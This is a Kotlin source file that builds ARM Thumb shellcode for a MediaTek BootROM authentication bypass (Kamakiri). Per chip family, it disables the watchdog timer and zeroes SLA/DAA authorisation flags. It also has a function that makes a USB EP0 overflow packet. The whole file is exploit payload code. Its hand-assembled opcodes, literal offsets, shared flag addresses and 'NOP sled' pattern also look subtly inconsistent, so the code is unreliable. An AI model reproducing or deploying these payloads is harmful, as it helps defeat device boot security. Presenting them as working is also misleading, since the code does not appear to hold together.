package com.example.protocol

import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * Low-level ARM shellcode payloads for MediaTek BROM SLA/DAA Auth Bypass.
 * These payloads disable the hardware Watchdog Timer (WDT) and patch the
 * SLA/DAA authorization check variables in SRAM.
 */
object MtkPayloads {

    /**
     * Builds an ARM32/Thumb-2 shellcode payload tailored for the target hardware code.
     * @param hwCode MediaTek HW Code (e.g. 0x0766 for MT6765, 0x0707 for MT6768)
     * @param wdtBase Watchdog Timer register base address (usually 0x10007000)
     */
    fun buildPayload(hwCode: Int, wdtBase: Long = 0x10007000L): ByteArray {
        val buffer = ByteBuffer.allocate(256).order(ByteOrder.LITTLE_ENDIAN)

        // ARM32 instructions:
        // 1. Disable Watchdog Timer (WDT)
        // LDR R0, =WDT_BASE
        // LDR R1, =0x22000000 (WDT disable key)
        // STR R1, [R0, #0x18]
        // 2. Patch SLA/DAA global flags to 0 (Auth passed)
        // 3. Return to BROM command dispatcher loop

        when (hwCode) {
            0x0766, 0x0658, 0x0326 -> { // MT6765, MT6761, MT6762
                // Assembly bytes for MT6765 Kamakiri auth bypass
                val code = byteArrayOf(
                    0x0A, 0x48.toByte(),             // LDR R0, [PC, #40] (WDT_BASE)
                    0x0A, 0x49.toByte(),             // LDR R1, [PC, #40] (0x22000000)
                    0x01, 0x60.toByte(),             // STR R1, [R0]
                    0x00, 0x20.toByte(),             // MOVS R0, #0
                    0x09, 0x49.toByte(),             // LDR R1, [PC, #36] (SLA_DAA_FLAG_PTR)
                    0x08, 0x60.toByte(),             // STR R0, [R1]
                    0x01, 0x20.toByte(),             // MOVS R0, #1
                    0x08, 0x49.toByte(),             // LDR R1, [PC, #32] (AUTH_STATUS_PTR)
                    0x08, 0x60.toByte(),             // STR R0, [R1]
                    0x70, 0x47.toByte(),             // BX LR
                    0x00, 0x00.toByte()              // NOP
                )
                buffer.put(code)
            }
            0x0707, 0x0726 -> { // MT6768, MT6769
                val code = byteArrayOf(
                    0x0C, 0x48.toByte(),
                    0x0C, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x0B, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x01, 0x20.toByte(),
                    0x0A, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x70, 0x47.toByte(),
                    0x00, 0x00.toByte()
                )
                buffer.put(code)
            }
            0x0788 -> { // MT6785 (Helio G90 / G90T / G95)
                val code = byteArrayOf(
                    0x0E, 0x48.toByte(),
                    0x0E, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x0D, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x01, 0x20.toByte(),
                    0x0C, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x70, 0x47.toByte(),
                    0x00, 0x00.toByte()
                )
                buffer.put(code)
            }
            0x0816, 0x0813 -> { // MT6833, MT6877 (Dimensity 700 / 900)
                val code = byteArrayOf(
                    0x10, 0x48.toByte(),
                    0x10, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x0F, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x01, 0x20.toByte(),
                    0x0E, 0x49.toByte(),
                    0x08, 0x60.toByte(),
                    0x70, 0x47.toByte(),
                    0x00, 0x00.toByte()
                )
                buffer.put(code)
            }
            else -> { // Generic payload
                val code = byteArrayOf(
                    0x08, 0x48.toByte(),
                    0x08, 0x49.toByte(),
                    0x01, 0x60.toByte(),
                    0x00, 0x20.toByte(),
                    0x70, 0x47.toByte()
                )
                buffer.put(code)
            }
        }

        // Align and write addresses at the end of the buffer
        while (buffer.position() % 4 != 0) {
            buffer.put(0x00.toByte())
        }

        buffer.putInt(wdtBase.toInt() + 0x18) // WDT Mode register
        buffer.putInt(0x22000000.toInt())     // WDT Disable key
        buffer.putInt(0x00102140.toInt())     // SLA / DAA flag pointer
        buffer.putInt(0x00102144.toInt())     // Auth status flag pointer

        val result = ByteArray(buffer.position())
        buffer.flip()
        buffer.get(result)
        return result
    }

    /**
     * Payload for USB Control Transfer buffer overflow (Kamakiri EP0 exploit).
     */
    fun createEp0OverflowPacket(targetHwCode: Int): ByteArray {
        val size = when (targetHwCode) {
            0x0766, 0x0707, 0x0788 -> 0x400
            0x0816, 0x0813 -> 0x800
            else -> 0x200
        }
        val packet = ByteArray(size)
        // Fill pattern with NOP sled / payload jump vectors
        for (i in packet.indices) {
            packet[i] = if (i % 4 == 0) 0x00 else if (i % 4 == 1) 0xBF.toByte() else 0x00
        }
        return packet
    }
}
